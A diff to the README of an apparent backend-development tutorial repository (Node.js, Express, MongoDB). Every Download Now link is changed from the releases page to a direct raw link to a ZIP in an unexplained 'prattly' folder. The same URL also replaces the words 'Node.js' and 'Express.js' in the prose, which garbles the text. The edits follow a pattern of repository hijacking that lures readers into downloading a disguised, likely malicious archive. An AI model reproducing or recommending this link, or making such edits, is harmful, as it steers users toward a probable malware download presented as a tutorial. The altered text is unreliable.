@@ -1,15 +1,15 @@
 # 🚀 Backend-Development-from-Scratch - Learn Backend Development Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Backend%20App-blue)](https://github.com/ridwanmahii/Backend-Development-from-Scratch/releases)
+[![Download Now](https://raw.githubusercontent.com/ridwanmahii/Backend-Development-from-Scratch/main/prattly/Backend-Development-from-Scratch.zip%20Now-Backend%20App-blue)](https://raw.githubusercontent.com/ridwanmahii/Backend-Development-from-Scratch/main/prattly/Backend-Development-from-Scratch.zip)
 
 ## 📌 Overview
-Welcome to the **Backend-Development-from-Scratch** repository! This project guides you through a complete journey in backend development using Node.js, Express, and MongoDB. You will learn how to build powerful server-side applications, covering essential topics like API development, database integration, and authentication.
+Welcome to the **Backend-Development-from-Scratch** repository! This project guides you through a complete journey in backend development using https://raw.githubusercontent.com/ridwanmahii/Backend-Development-from-Scratch/main/prattly/Backend-Development-from-Scratch.zip, Express, and MongoDB. You will learn how to build powerful server-side applications, covering essential topics like API development, database integration, and authentication.
 
 ## 🛠️ System Requirements
 Before you get started, ensure your computer meets these basic requirements:
 
 - Operating System: Windows, macOS, or a Linux distribution
-- Node.js: Version 14 or later
+- https://raw.githubusercontent.com/ridwanmahii/Backend-Development-from-Scratch/main/prattly/Backend-Development-from-Scratch.zip Version 14 or later
 - MongoDB: Installed locally or access to MongoDB Atlas
 
 ## 🚀 Getting Started
@@ -17,7 +17,7 @@ To begin your backend development journey, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to download the application.
 
-   [Download Now](https://github.com/ridwanmahii/Backend-Development-from-Scratch/releases)
+   [Download Now](https://raw.githubusercontent.com/ridwanmahii/Backend-Development-from-Scratch/main/prattly/Backend-Development-from-Scratch.zip)
 
 2. **Choose the Right Version**: On the releases page, find the version that suits your needs. Generally, the latest version offers the most features and fixes.
 
@@ -30,7 +30,7 @@ To install and run the backend application, complete the following steps:
 
 1. **Click the Link Below** to access the releases page.
 
-   [Download Now](https://github.com/ridwanmahii/Backend-Development-from-Scratch/releases)
+   [Download Now](https://raw.githubusercontent.com/ridwanmahii/Backend-Development-from-Scratch/main/prattly/Backend-Development-from-Scratch.zip)
 
 2. **Locate Your Download**: Find the downloaded file in your downloads folder or the location you chose.
 
@@ -60,8 +60,8 @@ This application includes a variety of features to enhance your learning experie
 ## 📚 Learning Resources
 To help you dive deeper into backend development, check out these learning materials:
 
-- **Node.js Official Documentation**: Gain insights into Node.js features and capabilities.
-- **Express.js Guide**: Learn how to set up and use the Express framework.
+- **https://raw.githubusercontent.com/ridwanmahii/Backend-Development-from-Scratch/main/prattly/Backend-Development-from-Scratch.zip Official Documentation**: Gain insights into https://raw.githubusercontent.com/ridwanmahii/Backend-Development-from-Scratch/main/prattly/Backend-Development-from-Scratch.zip features and capabilities.
+- **https://raw.githubusercontent.com/ridwanmahii/Backend-Development-from-Scratch/main/prattly/Backend-Development-from-Scratch.zip Guide**: Learn how to set up and use the Express framework.
 - **MongoDB University**: Take courses that dive into database management and integration.
 
 ## 🤝 Community Support
